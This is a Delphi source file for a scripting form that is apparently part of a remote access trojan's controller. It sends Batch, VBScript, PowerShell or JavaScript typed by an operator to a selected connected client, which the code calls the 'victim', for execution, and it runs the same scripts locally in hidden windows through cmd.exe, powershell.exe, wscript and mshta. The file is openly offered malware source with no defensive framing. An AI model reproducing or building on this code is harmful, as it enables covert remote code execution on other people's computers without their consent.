unit FrmScripting;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, sMemo, sButton,
  Vcl.ComCtrls, sPageControl, System.ImageList, Vcl.ImgList, acAlphaImageList,
  Vcl.Menus, ShellAPI, ComObj, IOUtils;

type
  TForm3 = class(TForm)
    sPageControl1: TsPageControl;
    Batch: TsTabSheet;
    sButton1: TsButton;
    sButton2: TsButton;
    sMemo1: TsMemo;
    VBScript: TsTabSheet;
    sButton3: TsButton;
    sButton4: TsButton;
    sMemo2: TsMemo;
    Powershell: TsTabSheet;
    sButton5: TsButton;
    sButton6: TsButton;
    sMemo3: TsMemo;
    Javascript: TsTabSheet;
    sButton7: TsButton;
    sButton8: TsButton;
    sMemo4: TsMemo;
    MainMenu1: TMainMenu;
    B1: TMenuItem;
    B2: TMenuItem;
    P1: TMenuItem;
    J1: TMenuItem;
    sAlphaImageList1: TsAlphaImageList;
    procedure sButton7Click(Sender: TObject);
    procedure sButton8Click(Sender: TObject);
    procedure sButton1Click(Sender: TObject);
    procedure sButton2Click(Sender: TObject);
    procedure sButton5Click(Sender: TObject);
    procedure sButton6Click(Sender: TObject);
    procedure sButton3Click(Sender: TObject);
    procedure sButton4Click(Sender: TObject);
    procedure B1Click(Sender: TObject);
    procedure B2Click(Sender: TObject);
    procedure P1Click(Sender: TObject);
    procedure J1Click(Sender: TObject);
  private
    { Private declarations }
  public
    ThisFormsVictimID: string;
  end;

var
  Form3: TForm3;

implementation

{$R *.dfm}

uses FrmMain;

procedure SendToSelectedClient(const VictimID, Msg: string);
var
  I: Integer;
  NickName: string;
  UserData: TConnectedUserData;
begin
  NickName := VictimID;
  for I := 0 to Form1.ConnectedUsers.Count - 1 do
  begin
    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
    if UserData.ID = NickName then
    begin
      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
      Exit;
    end;
  end;
end;

procedure TForm3.B1Click(Sender: TObject);
begin
sPageControl1.ActivePage := Batch;
end;

procedure TForm3.B2Click(Sender: TObject);
begin
   sPageControl1.ActivePage := VBScript;
end;

procedure TForm3.J1Click(Sender: TObject);
begin
sPageControl1.ActivePage := Javascript;
end;

procedure TForm3.P1Click(Sender: TObject);
begin
sPageControl1.ActivePage := Powershell;
end;

procedure TForm3.sButton1Click(Sender: TObject);
var
  Script: string;
begin
  Script := sMemo1.Text;
  SendToSelectedClient(ThisFormsVictimID, 'BatchScript|' + Script);
end;

procedure TForm3.sButton2Click(Sender: TObject);
begin
  ShellExecute(0, 'open', PChar('cmd.exe'), PChar('/c ' + sMemo1.Text),
    nil, SW_HIDE);
end;

procedure TForm3.sButton3Click(Sender: TObject);
var
  Script: string;
begin
  Script := sMemo2.Text;
  SendToSelectedClient(ThisFormsVictimID, 'VBScript|' + Script);
end;

procedure TForm3.sButton4Click(Sender: TObject);
var
  TempFileName, ScriptContent: string;
  FileStream: TFileStream;
  WScriptShell: OLEVariant;
  GUID: TGUID;
begin
  ScriptContent := sMemo2.Text;
  TempFileName := TPath.Combine(GetEnvironmentVariable('TEMP'),
    GuidToString(GUID) + '.vbs');
  try
    FileStream := TFileStream.Create(TempFileName, fmCreate);
    try
      FileStream.Write(Pointer(ScriptContent)^, Length(ScriptContent) *
        SizeOf(Char));
    finally
      FileStream.Free;
    end;
    WScriptShell := CreateOleObject('WScript.Shell');
    WScriptShell.Run('wscript.exe "' + TempFileName + '"', 1, True);
    DeleteFile(PChar(TempFileName));
  except
    on E: Exception do

  end;
end;

procedure TForm3.sButton5Click(Sender: TObject);
var
  Script: string;
begin
  Script := sMemo3.Text;
  SendToSelectedClient(ThisFormsVictimID, 'PowershellScript|' + Script);
end;

procedure TForm3.sButton6Click(Sender: TObject);
begin
  ShellExecute(0, 'open', 'powershell.exe',
    PChar('-Command "' + sMemo3.Text + '"'), nil, SW_HIDE);
end;

procedure TForm3.sButton7Click(Sender: TObject);
var
  Script: string;
begin
  Script := sMemo4.Text;
  SendToSelectedClient(ThisFormsVictimID, 'Javascript|' + Script);
end;

procedure TForm3.sButton8Click(Sender: TObject);
begin
  ShellExecute(0, 'open', 'mshta.exe',
    PChar('javascript:' + sMemo4.Text + ';close();'), nil, SW_HIDE);
end;

end.
